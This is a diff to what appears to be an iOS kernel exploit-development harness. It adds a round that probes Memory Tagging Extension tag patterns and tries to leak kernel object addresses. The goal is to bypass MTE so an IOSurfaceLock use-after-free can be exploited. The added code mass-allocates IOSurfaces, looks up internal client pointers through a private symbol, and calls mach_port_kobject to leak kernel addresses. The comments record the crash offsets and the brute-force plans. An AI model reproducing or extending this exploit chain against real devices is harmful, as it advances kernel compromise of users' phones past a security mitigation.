@@ -2999,6 +2999,183 @@ static void r291_probe(void) {
     fflush(stdout);
 }
 
+/* r292: MTE tag behavior — can we predict or influence tag assignment?
+ * r291 CONFIRMED: FlushProcessorCaches race crashes APP (not kernel).
+ * BulkAttachments returns BadArgument with raw bytes (dead end).
+ * UseCount inc/dec works but is likely userspace-cached.
+ *
+ * CONCLUSION: IOSurfaceLock is the ONLY kernel-side UAF trigger (r284).
+ * MTE is the SOLE defense. We MUST either bypass or predict MTE tags.
+ *
+ * MTE TAG BEHAVIOR TEST:
+ * On A20 Pro, MTE uses 4-bit tags (16 possible values, 0x0-0xF in top nibble).
+ * The allocator assigns tags per 16-byte granule on alloc. Question:
+ *   (a) Are tags random per allocation? → 1/16 brute-force needed
+ *   (b) Are tags deterministic (same slot → same tag)? → predictable
+ *   (c) Are tags round-robin? → predictable after observation
+ *
+ * We CAN'T read MTE tags from userspace (EL0). But we CAN infer them:
+ *   - Allocate an object, get its tagged pointer from the kernel
+ *   - The tagged pointer's top 4 bits (bits 59-56) are the MTE tag
+ *   - IOSurface kernel addresses from panic logs show tags
+ *
+ * From r284 panic: access tag 0xf9, expected 0xf6.
+ *   The freed memory had tag 0xf6. The access used tag 0xf9.
+ *   After free, the allocator changed the tag from 0xf9 to 0xf6.
+ *   OR: the pointer had 0xf9, the memory was originally 0xf9, and
+ *   after free the memory's tag was changed to 0xf6.
+ *
+ * Test: allocate many objects of the same size, record their base
+ * addresses. The top nibble of each address IS the MTE tag. Check if
+ * there's a pattern.
+ *
+ * ALSO: Try the PHYSICAL address approach. IOSurface's backing store
+ * is mapped with known physical addresses. If we can get the physical
+ * address of the kernel object (from a panic log's FAR), we might be
+ * able to map it via IOSurface.
+ */
+static void r292_probe(void) {
+    rlog("\n=== r292: MTE Tag Behavior Analysis ===\n");
+    fflush(stdout);
+
+    /* Part 1: Userspace base address tags (NOT kernel MTE tags,
+     * but check if the userspace mapping shows tag patterns) */
+    rlog("\n--- Part 1: Userspace base address patterns ---\n");
+    fflush(stdout);
+    {
+        IOSurfaceRef surfs[32];
+        for (int i = 0; i < 32; i++) {
+            CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int w=64,h=64,bpe=4,bpr=64*4,pf=0x42475241,as=64*64*4;
+            CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+            CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+            CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+            CFNumberRef rn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+            CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+            CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn);
+            CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+            CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+            surfs[i] = IOSurfaceCreate(p);
+            CFRelease(p);
+        }
+        for (int i = 0; i < 32; i++) {
+            if (surfs[i]) {
+                IOSurfaceLock(surfs[i], 0, NULL);
+                void *base = IOSurfaceGetBaseAddress(surfs[i]);
+                IOSurfaceUnlock(surfs[i], 0, NULL);
+                uint64_t addr = (uint64_t)base;
+                uint8_t top_nibble = (addr >> 56) & 0xFF;
+                rlog("  [%2d] id=%3u base=%p top=0x%02x ref=%p\n",
+                    i, IOSurfaceGetID(surfs[i]), base, top_nibble, (void*)surfs[i]);
+            }
+        }
+        for (int i = 0; i < 32; i++) if (surfs[i]) CFRelease(surfs[i]);
+    }
+
+    /* Part 2: IOSurfaceRef object address tags */
+    rlog("\n--- Part 2: IOSurfaceRef object pointer tags ---\n");
+    fflush(stdout);
+    {
+        void *iosurfH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+        typedef void* IOSurfaceClientRef;
+        typedef IOSurfaceClientRef (*clientLookup_t)(uint32_t);
+        clientLookup_t clLookup = (clientLookup_t)dlsym(iosurfH, "IOSurfaceClientLookup");
+
+        IOSurfaceRef surfs[16];
+        for (int i = 0; i < 16; i++) {
+            CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int w=64,h=64,bpe=4,bpr=64*4,pf=0x42475241,as=64*64*4;
+            CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+            CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+            CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+            CFNumberRef rn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+            CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+            CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn);
+            CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+            CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+            CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+            surfs[i] = IOSurfaceCreate(p);
+            CFRelease(p);
+        }
+
+        for (int i = 0; i < 16; i++) {
+            if (surfs[i]) {
+                uint64_t surfAddr = (uint64_t)(void*)surfs[i];
+                IOSurfaceClientRef cl = clLookup(IOSurfaceGetID(surfs[i]));
+                uint64_t clAddr = (uint64_t)cl;
+                rlog("  [%2d] surfRef=0x%016llx clientRef=0x%016llx\n",
+                    i, surfAddr, clAddr);
+            }
+        }
+        for (int i = 0; i < 16; i++) if (surfs[i]) CFRelease(surfs[i]);
+    }
+
+    /* Part 3: Mach port-based kernel object address leak attempt.
+     * IOSurfaceCreateMachPort returns a Mach port. The port's kobject
+     * address might be derivable via mach_port_kernel_object or similar. */
+    rlog("\n--- Part 3: Mach port kobject address probe ---\n");
+    fflush(stdout);
+    {
+        CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int w=64,h=64,bpe=4,bpr=64*4,pf=0x42475241,as=64*64*4;
+        CFNumberRef wn=CFNumberCreate(NULL,kCFNumberIntType,&w);
+        CFNumberRef hn=CFNumberCreate(NULL,kCFNumberIntType,&h);
+        CFNumberRef bn=CFNumberCreate(NULL,kCFNumberIntType,&bpe);
+        CFNumberRef rn=CFNumberCreate(NULL,kCFNumberIntType,&bpr);
+        CFNumberRef pfn=CFNumberCreate(NULL,kCFNumberIntType,&pf);
+        CFNumberRef asn=CFNumberCreate(NULL,kCFNumberIntType,&as);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceWidth"),wn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceHeight"),hn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerElement"),bn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceBytesPerRow"),rn);
+        CFDictionarySetValue(p,CFSTR("IOSurfacePixelFormat"),pfn);
+        CFDictionarySetValue(p,CFSTR("IOSurfaceAllocSize"),asn);
+        CFRelease(wn);CFRelease(hn);CFRelease(bn);CFRelease(rn);CFRelease(pfn);CFRelease(asn);
+
+        IOSurfaceRef s = IOSurfaceCreate(p);
+        CFRelease(p);
+        mach_port_t mp = IOSurfaceCreateMachPort(s);
+        rlog("  surfID=%u machPort=0x%x\n", IOSurfaceGetID(s), mp);
+
+        /* Try mach_port_kobject — usually restricted but let's check */
+        natural_t ktype = 0;
+        mach_vm_address_t kaddr = 0;
+        kern_return_t kr = mach_port_kobject(mach_task_self(), mp, &ktype, &kaddr);
+        rlog("  mach_port_kobject: kr=0x%x type=%u addr=0x%llx\n", kr, ktype, kaddr);
+
+        /* Try mach_port_kernel_object */
+        unsigned int ktype2 = 0;
+        unsigned int kaddr2 = 0;
+        kr = mach_port_kernel_object(mach_task_self(), mp, &ktype2, &kaddr2);
+        rlog("  mach_port_kernel_object: kr=0x%x type=%u addr=0x%x\n", kr, ktype2, kaddr2);
+
+        /* Try task_info with MACH_TASK_BASIC_INFO */
+        struct task_basic_info info;
+        mach_msg_type_number_t cnt = TASK_BASIC_INFO_COUNT;
+        kr = task_info(mach_task_self(), TASK_BASIC_INFO, (task_info_t)&info, &cnt);
+        rlog("  task_basic_info: kr=0x%x resident=%u virtual=%u\n",
+            kr, info.resident_size, info.virtual_size);
+
+        mach_port_deallocate(mach_task_self(), mp);
+        CFRelease(s);
+    }
+
+    rlog("\n*** r292 probe complete ***\n");
+    fflush(stdout);
+}
+
 /* r286: Spray-between-free-and-access with MTE tag brute-force.
  * r284 CONFIRMED: Race between ClientRelease + Lock triggers kernel panic
  *   at PC offset 0x33C9380 in kernelcache, accessing IOSurface+0xD8.
@@ -28247,6 +28424,14 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 292) {
+            rlog("*** rounds=292: MTE Tag Behavior Analysis ***\n");
+            rlog("  r291: FlushCache race crashes APP not kernel, BulkSet=BadArg.\n");
+            rlog("  Lock is ONLY kernel UAF. Must understand MTE tags.\n\n");
+            fflush(stdout);
+            r292_probe();
             goto done;
         }
         if (rounds == 291) {
